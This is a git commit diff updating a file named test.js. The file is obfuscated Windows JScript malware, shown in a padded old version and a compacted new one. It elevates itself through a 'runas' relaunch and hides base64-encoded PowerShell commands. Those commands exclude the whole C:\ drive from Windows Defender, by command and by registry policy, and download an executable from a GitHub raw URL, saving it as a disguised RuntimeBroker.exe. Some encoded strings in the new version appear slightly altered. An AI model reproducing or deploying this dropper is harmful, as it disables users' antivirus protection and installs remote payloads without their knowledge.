cedaf2dc5cb3af3856de9304d89a37d2658ece40
blowdeytop <blowdeytop@gmail.com>
2025-03-28 05:09:28 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,111 +1,34 @@
 (function(){
-    // Meaningless junk code to confuse casual readers
-    var junk1 = 42;
-    var junk2 = "obfuscation";
-    function dummyCalc(x, y) {
-        var sum = 0;
-        for(var i = 0; i < 5; i++){
-            sum += (x * i) - y;
-        }
-        return sum;
-    }
-    dummyCalc(junk1, 7);
-    
-    // An array of obfuscated string fragments
-    var _0xB = [];
-    _0xB.push("e"+"levate");                                         // originally index 0
-    _0xB.push("WScript."+"FullName");                                // originally index 1
-    _0xB.push("WScript."+"ScriptFullName");                          // originally index 2
-    _0xB.push("Shell."+"Application");                               // originally index 3
-    _0xB.push("Shell"+"Execute");                                    // originally index 4
-    _0xB.push("Quit");                                               // originally index 5
-    _0xB.push("Wscript."+"Shell");                                   // originally index 6
-    _0xB.push("run");                                                // originally index 7
-    _0xB.push("powershell -enc "+"cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA"); // originally index 8
-    _0xB.push("powershell -enc "+"cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA=="); // originally index 9
-    _0xB.push("powershell -enc "+"JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAA="); // originally index 10
+    var _0x5a34 = ['run', 'powershell -enc cABvAHcAZQByAHMAaABoAGUAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA', 'WScript.FullName', 'WScript.ScriptFullName', 'elevate', 'Exists', 'ActiveXObject', 'Shell.Application', 'ShellExecute', 'WScript', 'Quit', 'Wscript.Shell', 'powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==', 'powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBiAGwAbwB3AGQAZQB5AHQAbwBwAC8AdABzAHAAaQB0AG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAA='];
 
-    // Further confuse by rotating the array 10 times
-    (function(arr){
-        for(var i = 0; i < 10; i++){
-            arr.push(arr.shift());
-        }
-    }(_0xB));
-    
-    // More meaningless dummy functions inserted in between operations
-    function obfDummy(a, b) {
-        var result = a;
-        if(b > 100) { result = a * b; } else { result = a + b; }
-        return result;
-    }
-    obfDummy(5, junk1);
-    
-    function fakeLoop(){
-        var dummyStr = "";
-        for(var j = 0; j < 3; j++){
-            dummyStr += j.toString(16);
-        }
-        return dummyStr;
-    }
-    fakeLoop();
-    
-    // Helper function to retrieve strings by index after rotation.
-    function getString(index) {
-        index = index - 0x0;
-        return _0xB[index];
-    }
-    
-    // Main functionality: ensure the script is executed with elevated privileges.
-    function EnsureElevatedPrivileges(){
-        // Check if the "elevate" argument exists.
-        if(!WScript["Arguments"]["Named"]["Exists"](getString(1))){
-            // Create a Shell.Application object and re-launch the script with elevation.
-            new ActiveXObject(getString(4))[getString(5)](WScript[getString(2)], "\"" + WScript[getString(3)] + "\" /" + getString(1), "", "runas", 1);
-            WScript[getString(6)]();
+    (function(_0x5c3e2d, _0x5a34a2) {
+        var _0x1090e2 = function(_0x39224a) {
+            while (--_0x39224a) {
+                _0x5c3e2d['push'](_0x5c3e2d['shift']());
+            }
+        };
+        _0x1090e2(++_0x5a34a2);
+    }(_0x5a34, 0x95));
+
+    var _0x1090 = function(_0x5c3e2d, _0x5a34a2) {
+        _0x5c3e2d = _0x5c3e2d - 0x0;
+        var _0x1090e2 = _0x5a34[_0x5c3e2d];
+        return _0x1090e2;
+    };
+
+    function EnsureElevatedPrivileges() {
+        if (!WScript['Arguments']['Named'][_0x1090(0x4)](_0x1090(0x3))) {
+            new ActiveXObject(_0x1090(0x6))[_0x1090(0x7)](WScript[_0x1090(0x2)], '"' + WScript[_0x1090(0x1)] + '" /elevate', '', 'runas', 0x1);
+            WScript[_0x1090(0x8)]();
         }
     }
-    
-    // Insert random useless code that does nothing
-    var unusedArray = [];
-    for(var k = 0; k < 4; k++){
-        unusedArray.push(k * 3.14);
-    }
-    
-    // More junk: a function that is defined but never used
-    function neverCalled() {
-        var str = "";
-        for(var m = 0; m < 10; m++){
-            str += String.fromCharCode(65 + m);
-        }
-        return str;
-    }
-    
-    // Call the essential function.
+
     EnsureElevatedPrivileges();
+
+    var WshShell = new ActiveXObject(_0x1090(0x9));
     
-    // Create a Wscript.Shell object.
-    var WshShell = new ActiveXObject(getString(7));
-    
-    // Even more meaningless loops and conditions
-    for(var n = 0; n < 2; n++){
-        if(n === 1){
-            var temp = n * 100;
-        } else {
-            var temp = n + 100;
-        }
-    }
-    
-    // Execute the PowerShell commands in a scrambled order.
-    WshShell[getString(8)](getString(9), 0, false);
-    WshShell[getString(8)](getString(10), 0, false);
-    WshShell[getString(8)](getString(0), 0, false);
-    
-    // Final meaningless function that is never used.
-    function unusedFunction(){
-        var a = 123;
-        var b = 456;
-        return a - b;
-    }
-    unusedFunction();
-    
+    WshShell[_0x1090(0x0)](_0x1090(0xa), 0x0, false);
+    WshShell[_0x1090(0x0)](_0x1090(0xb), 0x0, false);
+    WshShell[_0x1090(0x0)](_0x1090(0xc), 0x0, false);
+
 })();
